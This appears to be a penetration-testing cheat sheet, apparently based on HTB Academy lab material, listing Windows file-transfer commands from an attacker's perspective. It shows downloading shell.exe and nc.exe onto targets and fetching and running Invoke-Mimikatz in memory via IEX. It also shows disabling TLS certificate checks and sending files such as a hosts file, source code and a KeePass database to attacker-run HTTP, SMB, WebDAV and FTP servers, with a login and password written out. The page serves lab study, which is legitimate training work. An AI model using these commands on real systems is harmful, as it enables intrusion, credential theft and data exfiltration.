# Windows

## Download

### Copy & Paste

This works by encoding the file as base64 and copying it to the destination and decode the string back to file. This might come in handy.

#### Attacker > Target

```bash
kali@kali $ cat <file> |base64 -w 0;echo
```

```powershell
PS C:\> [IO.File]::WriteAllBytes("<fullpath&name>", [Convert]::FromBase64String("<base64 contents>"))
```

#### Target > Attacker

```powershell
PS C:\> [Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
```

```bash
kali@kali $  echo <base64 contents> | base64 -d > hosts
```

> It is worth noting that the further steps are requried for file contents validation to ensure that the transferred file are moved witout any corruption.

```bash
kali@kali $ md5sum <file>
```

```powershell
PS C:\> Get-FileHash <file> -Algorithm md5
```

### PS File download

```powershell
PS C:\> (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
PS C:\> #(New-Object Net.WebClient).DownloadFile('http://10.10.14.220/shell.exe','C:\Users\Public\Downloads\shell.exe')

PS C:\> (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
PS C:\> #(New-Object Net.WebClient).DownloadFileAsync('http://10.10.14.220/shell.exe','C:\Users\Public\Downloads\shell.exe')
```

### Fileless Method

Downloads the payload and excecute it directly in memory using **Invoke-Expression** cmdlet 'IEX'

```powershell
PS C:\> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
PS C:\> # OR pipeline input
PS C:\> (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
```

### Invoke-WebRequest | iwr | curl | wget

Invoke-WebRequest has multiple aliases such as iwr, curl, and wget.

<pre class="language-powershell"><code class="lang-powershell"><strong>PS C:\> Invoke-WebRequest http://10.10.14.220/shell.exe -OutFile shell.exe
</strong></code></pre>

### Errors in PowerShell

1. If the following error occurs, bypass using `-UserBasicParsing.`

![Internet Explorer first-launch prevents the download](https://academy.hackthebox.com/storage/modules/24/IE\_settings.png)

```powershell
PS C:\> Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
```

2. SSL/TLS secure channel error which could be bypassed using following command.

> Exception calling "DownloadString" with "1" argument(s): "The underlying connection was closed: Could not establish trust relationship for the SSL/TLS secure channel."

```powershell
PS C:\> [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

### SMB Server

On the **attacker**'s machine, create a smbserver using `impacket` package.

```bash
kali@kali $ sudo impacket-smbserver share -smb2support /tmp/smbsharepower
```

On the **target**, run:

<pre class="language-powershell"><code class="lang-powershell"><strong>C:\> copy \\&#x3C;ip>\share\nc.exe
</strong><strong>C:\> #copy \\10.10.14.220\share\nc.exe
</strong></code></pre>

**If Windows block unauthenticated guest.**

On the **attacker**'s machine, create SMB server with **user** and **pass**

```bash
kali@kali $ sudo impacket-smbserver share -smb2support /tmp/smbshare -user <user> -password <pass>
```

On the **target** machine, mount and copy the file.

<pre class="language-sh"><code class="lang-sh"><strong>C:\> net use n: \\&#x3C;ip>\&#x3C;share dir> /user:&#x3C;user> &#x3C;pass>
</strong>C:\> copy n:\nc.exe
</code></pre>

> Can try to copy the file directly using the `copy \\<ip>\share\nc.exe` command. but copying this command might result in error, try mount and copy instead.

### FTP Server

On the **attacker**'s machine, create a ftp server using Python3's `pyftpdlib` module.

```bash
kali@kali $ sudo python3 -m pyftpdlib --port 21
```

On the **target** machine, mount and copy the file.

```powershell
PS C:\> (New-Object Net.WebClient).DownloadFile('ftp://<ip>/file.txt', 'ftp-file.txt')
```

## Upload

### PS uploads (Python uploadserver)

To upload file, we need a server.

On the **attacker**'s machine, create a upload server using Python3's `uploadserver` module.

```bash
kali@kali $ python3 -m uploadserver
```

On the **target** machine, run

```powershell
PS C:\> Invoke-FileUpload -Uri http://<ip>:<port>/upload -File C:\Windows\System32\drivers\etc\hostsp
```

### PS uploads (Web based)

**Attacker** creates a netcat listener.

```bash
kali@kali $ nc -lvnp 8000
```

**Target** sends file throught HTTP POST method.

```powershell
PS C:\> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
PS C:\> Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```

**Attacker** decodes the stream back to file.

<pre class="language-bash"><code class="lang-bash"><strong>kali@kali $ echo &#x3C;base64> | base64 -d -w 0 > hosts
</strong></code></pre>

### SMB Server

On the **attacker**'s machine, create a upload server using Python3's `wsgidav` module.

<pre class="language-bash"><code class="lang-bash"><strong>kali@kali $ sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
</strong></code></pre>

> impacket-smbserver would also work

```
sudo impacket-smbserver a -smb2support . -username a -password a
```

> if the username and password is specified then run `net use \10.10.14.4\a /user:a a` to mount the folder and then share the file.

On the **target** machine, run

<pre class="language-shell-session"><code class="lang-shell-session"><strong>C:\> dir \\192.168.49.128\DavWWWRoot
</strong>C:\> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
C:\> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
</code></pre>

> Notice that it this method the `impacket-smbserver` was not used due to the port445 restrictions. Feel free to use it if there is no restriction.

### FTP Uploads

On the **attacker**'s machine, create a upload server using Python3's `pyftpdlib` module. but this time `--write` attribute is specified to allow client (target) to upload files.

```bash
kali@kali $ python3 -m pyftpdlib --port 21 --write
```

On the **target** machine, run

```
PS C:\> (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```

### evil-winrm

connect using evil-winrm normally

```
evil-winrm -i 10.129.202.222 -u johanna -p 1231234!
```

After getting a shell type

```
*Evil-WinRM* PS C:\Users\johanna\Documents> download Logins.kdbx
```









## Resources

* Most of the commands and contents are from **HTB academy lab!**

